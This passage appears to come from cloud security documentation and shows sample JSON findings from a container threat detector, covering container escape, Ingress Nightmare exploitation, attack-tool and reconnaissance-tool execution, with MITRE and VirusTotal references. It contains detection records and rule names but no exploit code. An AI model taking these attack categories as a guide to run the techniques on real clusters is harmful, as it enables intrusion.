                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://10.77.124.129:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"10.77.124.129\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/malicious_files\""
              }
            ],
            "pid": "7",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "display_name": "CLUSTER_ID",
        "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "project_display_name": "PROJECT_ID",
        "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parent_display_name": "PROJECT_ID",
        "type": "google.container.Cluster",
        "folders": []
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "built_in_malicious_binary_executed"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1699911519",
                "nanos": 603253608
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1106/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal IP Link",
              "url": "https://www.virustotal.com/gui/file/275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/detection"
            }
          ],
          "cloudLoggingQueryUri": [
            {
              "displayName": "Cloud Logging Query Link",
              "url": "https://console.cloud.google.com/logs/query;query=timestamp%3D%222023-11-13T21:38:39.603253608Z%22%0AinsertId%3D%22%22?project=PROJECT_NUMBER"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
      

#### Execution: Container Escape
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Container Escape",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2024-10-21T19:08:35.255Z",
        "database": {},
        "eventTime": "2024-10-21T19:08:35.091Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2024-06-17T18:50:13Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2024-10-21T19:07:41.503072537Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "USER_EXECUTION"
          ],
          "additionalTactics": [
            "PRIVILEGE_ESCALATION"
          ],
          "additionalTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-container-escape-suspicious-tool-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_container_escape"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1611/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/21225e29b4225a4eca16996445e243fdab8051a0ad4bc232b907ef5e9b67f66b/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Ingress Nightmare Vulnerability Execution ([Preview](https://cloud.google.com/products/#product-launch-stages))
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Ingress Nightmare Vulnerability Exploitation",
        "chokepoint": {},
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2025-04-17T18:54:09Z"
          }
        ],
        "createTime": "2025-04-17T18:54:14.136Z",
        "database": {},
        "dataProtectionKeyGovernance": {},
        "eventTime": "2025-04-17T18:54:13.952Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-04-17T18:54:09Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-04-17T18:54:09.924746656Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "SHARED_MODULES"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/tmp/nginx\"",
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"/tmp/nginx\"",
              "\"/proc/1/fd/1\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-ingress-nightmare-2025-04-17-18-54-06-utc\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"0\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"_\"",
                "val": "\"/tmp/nginx\""
              }
            ],
            "pid": "1",
            "parentPid": "0"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "MEDIUM",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_ingress_nightmare_vulnerability_exploitation"
        },
        "detectionPriority": "MEDIUM",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1744916049",
                "nanos": 924746656
              }
            }
          }
        ],
        "properties": {},
        "findingId": "b19bf4b85b504a5da1a64cdadd4c8194",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0002/"
          },
          "relatedFindingUri": {}
        }
      }
    }
        

#### Execution: Kubernetes Attack Tool Execution
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Kubernetes Attack Tool Execution",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "1970-01-01T00:00:00Z"
          }
        ],
        "createTime": "2024-10-21T19:08:35.255Z",
        "database": {},
        "eventTime": "2024-10-21T19:08:35.091Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "1970-01-01T00:00:00Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2024-10-21T19:07:41.503072537Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "RESOURCE_DEVELOPMENT",
          "primaryTechniques": [
            "OBTAIN_CAPABILITIES"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-kubernetes-attack-suspicious-tool-864dfecdc8d5f5d4\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "SEVERITY_UNSPECIFIED",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_kubernetes_attack_tool_execution"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1588/002/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/21225e29b4225a4eca16996445e243fdab8051a0ad4bc232b907ef5e9b67f66b/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Local Reconnaissance Tool Execution
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Execution: Local Reconnaissance Tool Execution",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "1970-01-01T00:00:00Z"
          }
        ],
        "createTime": "2024-10-21T19:08:35.255Z",
        "database": {},
        "eventTime": "2024-10-21T19:08:35.091Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "1970-01-01T00:00:00Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2024-10-21T19:07:41.503072537Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "RECONNAISSANCE",
          "primaryTechniques": [
            "ACTIVE_SCANNING"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-local-reconn-suspicious-tool-90e2e63d67bbc483\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "SEVERITY_UNSPECIFIED",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_local_reconnaissance_tool_execution"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1595/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/21225e29b4225a4eca16996445e243fdab8051a0ad4bc232b907ef5e9b67f66b/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Malicious Python Executed
    
    
    {
      "finding": {
        "canonicalName": "projects/PROJECT_ID/sources/SOURCE_ID/locations/global/findings/FINDING_ID",
        "category": "Execution: Malicious Python Executed",
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2024-06-17T18:50:15.454Z",
        "description": "A machine learning model using Natural Language Processing  techniques identified an executed python script as malicious.",
        "eventTime": "2024-06-17T18:50:15.217Z",
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2024-06-17T18:50:13Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
